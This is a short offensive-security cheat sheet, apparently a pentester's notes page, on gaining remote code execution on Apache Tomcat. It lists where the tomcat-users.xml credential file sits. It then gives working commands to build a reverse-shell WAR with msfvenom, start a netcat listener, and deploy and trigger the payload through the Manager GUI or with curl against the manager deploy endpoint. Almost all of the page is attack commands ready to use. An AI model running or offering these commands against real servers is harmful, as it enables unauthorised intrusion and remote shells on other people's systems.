---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
---

### Config Location

```console
/usr/share/tomcat9/etc/tomcat-users.xml
```

```console
/etc/tomcat9/tomcat-users.xml
```

---

### RCE (Authenicated)

#### 1. Create a WAR file

```console
msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war
```

#### 2. Start a listener

```console
rlwrap nc -lvnp <LOCAL_PORT>
```

{{< tab set1 tab1 active >}}3a. Manager GUI{{< /tab >}}
{{< tab set1 tab2 >}}3b. Manager Script{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
+--------------------------------------------+
| Exploit                                    |
+--------------------------------------------+
| 1. Login to Tomcat Web Application Manager |
| 2. WAR file to deploy -> Deploy            |
| 3. Click /revshell in Applications table   |
+--------------------------------------------+
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
curl -u '<USER>:<PASSWORD>' http://<DOMAIN>:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
```

```console
curl -s http://<DOMAIN>:8080/revshell
```

{{< /tabcontent >}}

<br>
